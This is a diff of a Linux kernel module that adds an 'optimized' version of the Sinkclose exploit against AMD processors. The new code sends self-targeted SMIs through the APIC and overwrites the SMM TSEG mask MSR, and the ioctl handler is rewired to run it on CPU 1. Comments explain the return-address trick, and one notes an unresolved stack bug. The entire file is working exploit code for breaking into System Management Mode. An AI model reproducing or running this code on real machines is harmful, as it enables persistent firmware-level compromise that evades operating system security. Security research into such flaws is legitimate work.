@@ -21,7 +21,7 @@
 #include <linux/mm.h>
 #include <linux/string.h>
 #include <linux/atomic.h>
-
+#include <asm/apic.h> 
 #include "kernetix.h"
 
 #include <linux/efi.h>
@@ -211,7 +211,7 @@ static void core1_staging(void *info) {
 static atomic_t core1_sinkclose_executed = ATOMIC_INIT(0);
 static atomic_t core1_sinkclose_finished = ATOMIC_INIT(0);
 
-static void core1_sinkclose(void *info) {
+static void core_sec_smi_callback(void *info) {
     printk(KERN_INFO "CORE %d entering sinkclose", smp_processor_id());
 
     // Set prepared to 0
@@ -256,6 +256,57 @@ static void test_gdt_mapping(void){
 }
 
 #define AMD_MSR_SMM_TSEG_MASK  0xC0010113
+
+static void send_IPI_from_core_to_zero(void *info) {
+}
+
+static void sinkclose_exploit_optimized(void *info) {  
+    UINT64 tseg_mask = 0;
+    UINT64 flags;
+    UINT64 executed_smi = 0;
+    UINT64 core_id = smp_processor_id();
+    printk(KERN_INFO "sinkclose_exploit_optimized executing on CPU %d\n", core_id);
+    
+    local_irq_save(flags); /* interrupts disabled */
+
+    apic->send_IPI(core_id, APIC_DM_SMI);
+
+    //if(READ_ONCE(executed_smi) != 0){
+    //    pr_info("executed_smi: %d\n", READ_ONCE(executed_smi));
+    //    local_irq_restore(flags); /* interrupts restored to previous state */
+    //    return;
+    //}
+
+    // Somehow we fuck up the stack if we remove this pr_info (i.e., the last printk is not printed)
+    // TODO: Debug why
+    pr_info("executed_smi: %d\n", READ_ONCE(executed_smi));
+    executed_smi++;
+    _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
+    pr_info("TSEG Mask Before Overwrite: %016llx\n", tseg_mask);
+    tseg_mask = tseg_mask | (0b11 << 2);    
+    _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
+    pr_info("TSEG Mask After Overwrite: %016llx\n", tseg_mask);
+    
+    /*
+     * Why does this work? We are calling a function (pretty sure),
+     * thus we are pushing our current RIP onto the stack.
+     * Due to sinkclose we are not storing the RIP in the SMM SAVE STATE
+     * However, the previous RIP still points to the exit routine of send_IPI
+     * Thus when we return from the SMM handler, we will return to the SAME 
+     * code segment as before (probably somewhere in send_IPI or one of the sub functions)
+
+     * When this routine exits it pops the **correct** return address and 
+     * execution continues as normal 
+    */
+    
+    apic->send_IPI(core_id, APIC_DM_SMI);
+    
+    // sanity
+    local_irq_restore(flags); /* interrupts restored to previous state */
+    printk(KERN_INFO "sinkclose_exploit_optimized finished\n");
+}
+
+
 static void sinkclose_exploit(void *info) {  
     UINT64 tseg_mask = 0;
     SW_SMI_CALL *smi = (SW_SMI_CALL *) info;
@@ -292,7 +343,7 @@ static void sinkclose_exploit(void *info) {
         atomic_set(&core1_sinkclose_executed, 0);
 
         call_single_data_t csd;
-        INIT_CSD(&csd, core1_sinkclose, NULL);
+        INIT_CSD(&csd, core_sec_smi_callback, NULL);
 
         // Schedule the callback to be executed on CPU 1 asynchronously
         smp_call_function_single_async(CORENUM, &csd);
@@ -307,20 +358,19 @@ static void sinkclose_exploit(void *info) {
         _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
         _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
         pr_info("TSEG Mask After Overwrite: %016llx\n", tseg_mask);
-/*         tseg_mask &= ~(0b11 << 2);
+        tseg_mask &= ~(0b11 << 2);
         _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
         _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
-        pr_info("TSEG Restore: %016llx\n", tseg_mask); */
+        pr_info("TSEG Restore: %016llx\n", tseg_mask);
         _swsmi(smi);
         // Signal Core1 that it can continue
-        atomic_inc_return(&core1_sinkclose_finished);
+        
+        
         _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
         pr_info("TSEG Mask After Execution: %016llx\n", tseg_mask);
         printk(KERN_INFO "CORE0 sinkclose executed shellcode");
     }
-
     printk(KERN_INFO "sinkclose_exploit finished");
-
 }
 
 static long int kernetix_ioctl(struct file *file, 
@@ -441,8 +491,8 @@ static long int kernetix_ioctl(struct file *file,
 
         // Execute the callback on the target CPU
         ret = smp_call_function_single(
-              0,    // TARGET CPU is 0
-              sinkclose_exploit,
+              1,    // TARGET CPU is 1
+              sinkclose_exploit_optimized,
               (void *) swsmi_call, 
               1  // WAIT
         );
